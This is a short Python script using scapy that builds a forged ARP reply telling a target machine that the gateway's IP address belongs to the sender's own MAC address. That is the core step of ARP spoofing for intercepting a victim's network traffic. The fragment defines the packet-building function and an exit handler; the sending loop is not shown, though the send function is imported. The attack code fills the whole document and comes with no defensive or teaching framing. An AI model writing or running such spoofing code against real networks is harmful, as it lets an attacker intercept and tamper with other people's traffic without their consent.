import wmi
from scapy.all import (
    ARP,
    Ether,
    sendp,
    getmacbyip,
    get_if_hwaddr
)
import signal
import sys

def build_packet(TargetIp, GateWayAddr):
    print("[-] Obtaining mac from {}".format(TargetIp))  #Printing the IP address
    TargetMacAddr = None
    while not TargetMacAddr:
        TargetMacAddr = getmacbyip(TargetIp)  #Get the device's MAC address
    MyMacAddr = get_if_hwaddr("WLAN")  #Get the MAC address of network card
    pkt = Ether(src=MyMacAddr, dst=TargetMacAddr) / ARP(hwsrc=MyMacAddr, psrc=GateWayAddr, hwdst=TargetMacAddr,
                                                        pdst=TargetIp)
    pkt.show()
    print(pkt)
    return pkt

def stop(signal, frame):
    sys.exit(0)
